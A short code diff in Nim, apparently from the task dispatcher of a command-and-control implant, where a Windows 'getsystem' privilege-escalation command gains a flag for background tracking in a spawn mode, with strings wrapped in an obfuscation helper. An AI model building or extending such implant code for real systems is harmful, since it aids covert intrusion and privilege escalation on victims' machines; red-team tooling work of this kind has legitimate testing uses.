@@ -559,6 +559,9 @@ proc executeTask*(taskId: string, command: string, params: JsonNode): TaskExecut
         when defined(windows):
           debug "[DEBUG] Executing getsystem command"
           result.response = getsystem(taskId, params)
+          # If uuid is present, this is spawn mode and needs background tracking
+          if params.hasKey(obf("uuid")) and params[obf("uuid")].getStr().len > 0:
+            result.needsBackgroundTracking = true
         else:
           result.response = %*{
             obf("task_id"): taskId,
